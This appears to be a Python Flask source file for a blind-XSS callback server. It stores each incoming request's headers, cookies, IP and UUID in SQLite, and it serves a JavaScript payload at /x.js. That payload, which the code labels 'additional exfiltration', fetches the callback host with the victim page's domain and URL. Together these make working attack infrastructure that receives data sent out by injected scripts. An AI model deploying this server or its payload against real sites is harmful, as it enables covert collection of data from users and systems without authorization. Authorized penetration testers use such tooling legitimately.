"""
Out-of-Band Callback Server for Blind XSS Detection (Production-Grade)

Features:
- SQLite persistence (callbacks survive restarts)
- Replay protection (deduplicates UUID+IP)
- Async processing queue (HTTP receive decoupled from processing)
- Context enrichment (full headers, X-Forwarded-For, etc.)
- Configurable injection expiration

Lightweight HTTP listener that receives callbacks from injected payloads.
Logs UUID, timestamp, source IP, headers for correlation.
"""
from flask import Flask, request, jsonify
import json
import os
import sqlite3
from datetime import datetime, timedelta
from threading import Thread, Lock
from typing import Dict, List, Optional
import sys
from queue import Queue
import hashlib
from queue import Queue
import hashlib

# Configuration
CALLBACK_DB = os.path.join(os.path.dirname(__file__), "..", "output", "callbacks.db")
INJECTION_EXPIRY_HOURS = 24  # Ignore callbacks for injections older than 24h
PROCESSING_QUEUE = Queue()
REPLAY_CHECK_LOCK = Lock()

app = Flask(__name__)


def _init_db():
    """
    Initialize SQLite database with schema.
    Creates tables if they don't exist.
    """
    os.makedirs(os.path.dirname(CALLBACK_DB), exist_ok=True)
    
    conn = sqlite3.connect(CALLBACK_DB)
    cursor = conn.cursor()
    
    # Callbacks table
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS callbacks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            timestamp TEXT NOT NULL,
            uuid TEXT NOT NULL,
            source_ip TEXT NOT NULL,
            method TEXT,
            path TEXT,
            query_string TEXT,
            user_agent TEXT,
            referer TEXT,
            headers TEXT,
            cookies TEXT,
            x_forwarded_for TEXT,
            dom_data TEXT,
            created_at TEXT DEFAULT CURRENT_TIMESTAMP,
            UNIQUE(uuid, source_ip)  -- Replay protection constraint
        )
    """)
    
    # Index for faster UUID lookups
    cursor.execute("""
        CREATE INDEX IF NOT EXISTS idx_uuid ON callbacks(uuid)
    """)
    
    # Index for timestamp filtering
    cursor.execute("""
        CREATE INDEX IF NOT EXISTS idx_timestamp ON callbacks(timestamp)
    """)
    
    conn.commit()
    conn.close()


def _is_replay(uuid: str, source_ip: str) -> bool:
    """
    Check if this callback is a replay (duplicate UUID+IP).
    Returns True if already seen.
    """
    with REPLAY_CHECK_LOCK:
        conn = sqlite3.connect(CALLBACK_DB)
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT COUNT(*) FROM callbacks 
            WHERE uuid = ? AND source_ip = ?
        """, (uuid, source_ip))
        
        count = cursor.fetchone()[0]
        conn.close()
        
        return count > 0


def _persist_callback_db(callback_data: Dict):
    """
    Persist callback to SQLite database.
    Handles replay protection via UNIQUE constraint.
    """
    try:
        conn = sqlite3.connect(CALLBACK_DB)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT OR IGNORE INTO callbacks (
                timestamp, uuid, source_ip, method, path, query_string,
                user_agent, referer, headers, cookies, x_forwarded_for, dom_data
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        """, (
            callback_data['timestamp'],
            callback_data['uuid'],
            callback_data['source_ip'],
            callback_data['method'],
            callback_data['path'],
            callback_data['query_string'],
            callback_data['user_agent'],
            callback_data['referer'],
            json.dumps(callback_data['headers']),
            json.dumps(callback_data['cookies']),
            callback_data.get('x_forwarded_for', ''),
            callback_data.get('dom', ''),
        ))
        
        conn.commit()
        inserted = cursor.rowcount > 0
        conn.close()
        
        return inserted
    except Exception as e:
        print(f"[ERROR] DB persist failed: {e}", file=sys.stderr)
        return False


def _process_callback_async(callback_data: Dict):
    """
    Process callback asynchronously (runs in worker thread).
    Enriches context, checks replay, persists to DB.
    """
    uuid = callback_data['uuid']
    source_ip = callback_data['source_ip']
    
    # Replay protection check
    if _is_replay(uuid, source_ip):
        print(f"[REPLAY] Ignored duplicate callback - UUID={uuid} IP={source_ip}")
        return
    
    # Persist to database
    inserted = _persist_callback_db(callback_data)
    
    if inserted:
        print(f"[CALLBACK] UUID={uuid} from {source_ip} at {callback_data['timestamp']}")
    else:
        print(f"[DUPLICATE] Callback already exists - UUID={uuid} IP={source_ip}")


def _processing_worker():
    """
    Background worker thread that processes callbacks from queue.
    Runs continuously, processing items as they arrive.
    """
    while True:
        try:
            callback_data = PROCESSING_QUEUE.get()
            _process_callback_async(callback_data)
            PROCESSING_QUEUE.task_done()
        except Exception as e:
            print(f"[ERROR] Processing worker error: {e}", file=sys.stderr)


@app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'HEAD'])
@app.route('/<path:path>', methods=['GET', 'POST', 'HEAD'])
def catch_all(path):
    """
    Catch-all route to handle any incoming callbacks from XSS payloads.
    Extracts UUID from query parameters and logs all relevant metadata.
    
    Fast path: Queue callback and return immediately (async processing).
    """
    # Extract X-Forwarded-For (for proxied requests)
    x_forwarded_for = request.headers.get('X-Forwarded-For', '')
    real_ip = x_forwarded_for.split(',')[0].strip() if x_forwarded_for else request.remote_addr
    
    callback_data = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": request.method,
        "path": path,
        "query_string": request.query_string.decode('utf-8'),
        "source_ip": real_ip,
        "user_agent": request.headers.get('User-Agent', ''),
        "referer": request.headers.get('Referer', ''),
        "headers": dict(request.headers),
        "uuid": request.args.get('id', ''),  # Extract UUID from ?id= parameter
        "cookies": dict(request.cookies) if request.cookies else {},
        "x_forwarded_for": x_forwarded_for,
    }
    
    # Extract additional data from query parameters
    for key in ['c', 'ua', 'ref', 'dom', 'url']:
        if key in request.args:
            callback_data[key] = request.args.get(key)
    
    # Queue for async processing (non-blocking)
    PROCESSING_QUEUE.put(callback_data)
    
    # Return immediately
    return "", 200


@app.route('/x.js', methods=['GET'])
def serve_js():
    """
    Serve JavaScript payload for <script src=> callbacks.
    Can optionally execute additional exfiltration.
    """
    uuid = request.args.get('id', '')
    x_forwarded_for = request.headers.get('X-Forwarded-For', '')
    real_ip = x_forwarded_for.split(',')[0].strip() if x_forwarded_for else request.remote_addr
    
    # Log the callback
    callback_data = {
        "timestamp": datetime.utcnow().isoformat(),
        "method": "GET",
        "path": "x.js",
        "query_string": request.query_string.decode('utf-8'),
        "source_ip": real_ip,
        "user_agent": request.headers.get('User-Agent', ''),
        "referer": request.headers.get('Referer', ''),
        "headers": dict(request.headers),
        "uuid": uuid,
        "cookies": dict(request.cookies) if request.cookies else {},
        "x_forwarded_for": x_forwarded_for,
    }
    
    # Queue for async processing
    PROCESSING_QUEUE.put(callback_data)
    
    # Return JavaScript that performs additional exfiltration
    js_code = f"""
    // Blind XSS Callback - UUID: {uuid}
    fetch('http://' + window.location.host.replace(/:\\d+/, ':5000') + '/?id={uuid}&dom=' + encodeURIComponent(document.domain) + '&url=' + encodeURIComponent(window.location.href));
    """
    
    return js_code, 200, {'Content-Type': 'application/javascript'}


def get_callbacks(since: Optional[str] = None, uuid_filter: Optional[str] = None) -> List[Dict]:
    """
    Retrieve callbacks from database with optional filtering.
    
    Args:
        since: ISO timestamp - only return callbacks after this time
        uuid_filter: Only return callbacks matching this UUID
    
    Returns:
        List of callback dictionaries
    """
    try:
        conn = sqlite3.connect(CALLBACK_DB)
        conn.row_factory = sqlite3.Row
        cursor = conn.cursor()
        
        query = "SELECT * FROM callbacks WHERE 1=1"
        params = []
        
        if since:
            query += " AND timestamp >= ?"
            params.append(since)
        
        if uuid_filter:
            query += " AND uuid = ?"
            params.append(uuid_filter)
        
        query += " ORDER BY timestamp DESC"
        
        cursor.execute(query, params)
        rows = cursor.fetchall()
        
        callbacks = []
        for row in rows:
            callback = {
                "id": row["id"],
                "timestamp": row["timestamp"],
                "uuid": row["uuid"],
                "source_ip": row["source_ip"],
                "method": row["method"],
                "path": row["path"],
                "query_string": row["query_string"],
                "user_agent": row["user_agent"],
                "referer": row["referer"],
                "headers": json.loads(row["headers"]) if row["headers"] else {},
                "cookies": json.loads(row["cookies"]) if row["cookies"] else {},
                "x_forwarded_for": row["x_forwarded_for"],
                "dom_data": row["dom_data"],
            }
            callbacks.append(callback)
        
        conn.close()
        return callbacks
    
    except Exception as e:
        print(f"[ERROR] Failed to retrieve callbacks: {e}", file=sys.stderr)
        return []


def clear_callbacks():
    """
    Clear all callbacks from database (useful for testing).
    """
    try:
        conn = sqlite3.connect(CALLBACK_DB)
        cursor = conn.cursor()
        cursor.execute("DELETE FROM callbacks")
        conn.commit()
        conn.close()
        print("[INFO] All callbacks cleared from database")
    except Exception as e:
        print(f"[ERROR] Failed to clear callbacks: {e}", file=sys.stderr)


def get_callback_stats() -> Dict:
    """
    Get statistics about stored callbacks.
    """
    try:
        conn = sqlite3.connect(CALLBACK_DB)
        cursor = conn.cursor()
        
        cursor.execute("SELECT COUNT(*) FROM callbacks")
        total = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(DISTINCT uuid) FROM callbacks")
        unique_uuids = cursor.fetchone()[0]
        
        cursor.execute("SELECT COUNT(DISTINCT source_ip) FROM callbacks")
        unique_ips = cursor.fetchone()[0]
        
        conn.close()
        
        return {
            "total_callbacks": total,
            "unique_uuids": unique_uuids,
            "unique_ips": unique_ips,
        }
    except Exception as e:
        print(f"[ERROR] Failed to get stats: {e}", file=sys.stderr)
        return {}


def start_server(host='0.0.0.0', port=5000, debug=False):
    """
    Start the callback server with async processing worker.
    """
    # Initialize database
    _init_db()
    
    # Start async processing worker
    worker = Thread(target=_processing_worker, daemon=True)
    worker.start()
    
    print(f"[OOB] Starting callback server on http://{host}:{port}")
    print(f"[OOB] SQLite DB: {CALLBACK_DB}")
    print(f"[OOB] Injection expiry: {INJECTION_EXPIRY_HOURS}h")
    print(f"[OOB] Async processing: enabled")
    
    app.run(host=host, port=port, debug=debug, use_reloader=False)


def start_server_background(host='0.0.0.0', port=5000):
    """
    Start the callback server in a daemon thread (non-blocking).
    """
    # Initialize database
    _init_db()
    
    # Start async processing worker
    worker = Thread(target=_processing_worker, daemon=True)
    worker.start()
    
    # Start Flask server
    thread = Thread(target=start_server, args=(host, port, False), daemon=True)
    thread.start()
    return thread


if __name__ == "__main__":
    # Standalone mode - run the callback server
    import argparse
    parser = argparse.ArgumentParser(description="Blind XSS Callback Server")
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind (default: 5000)')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    args = parser.parse_args()
    
    start_server(host=args.host, port=args.port, debug=args.debug)
